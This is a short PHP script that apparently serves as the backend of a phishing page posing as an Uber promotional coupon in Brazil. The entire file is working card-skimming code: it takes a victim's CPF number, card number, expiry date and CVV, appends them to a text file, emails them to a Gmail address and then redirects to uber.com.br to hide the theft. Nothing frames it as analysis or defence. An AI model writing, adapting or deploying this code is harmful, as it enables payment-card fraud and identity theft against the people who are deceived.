<?php
if($_POST){
  $cpf = $_POST['cpf'];
  $cartao = $_POST['cartao'];
  $validade = $_POST['validade'];
  $cvv = $_POST['cvv'];

  $data = "$cpf, $cartao, $validade, $cvv\n";
  $file = 'INFO.txt';

  if(file_exists($file)){
    $handle = fopen($file, 'a');
  } else {
    $handle = fopen($file, 'w');
  }

  fwrite($handle, $data);
  fclose($handle);

  $to = 'vida.veral15@gmail.com';
  $subject = 'Novo cupom promocional Uber';
  $message = "CPF: $cpf\nCartão: $cartao\nValidade: $validade\nCVV: $cvv";
  $headers = 'From: vida.veral15@gmail.com' . "\r\n" .
    'Reply-To: vida.veral15@gmail.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

  mail($to, $subject, $message, $headers);

  header('Location: https://www.uber.com.br');
  exit();
}
?>
